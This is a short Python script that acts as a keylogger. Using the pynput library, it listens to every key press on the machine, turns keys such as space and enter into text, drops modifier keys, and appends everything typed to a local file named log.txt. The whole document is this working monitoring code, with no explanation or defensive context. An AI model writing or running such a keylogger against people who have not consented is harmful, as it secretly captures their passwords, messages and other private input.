from pynput.keyboard import Listener

def writetofile(key):
    letter=str(key)
    letter=letter.replace("'", "")
    n=("Key.ctrl_l","Key.ctrl_r","Key.shift_l","Key.shift_r","Key.shift","Key.esc","Key.right","Key.left")
    if letter=="Key.space":
        letter=" "
    elif letter in n:
        letter=""
    elif letter=="Key.enter":
        letter="\n"
    with open("log.txt","a") as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()
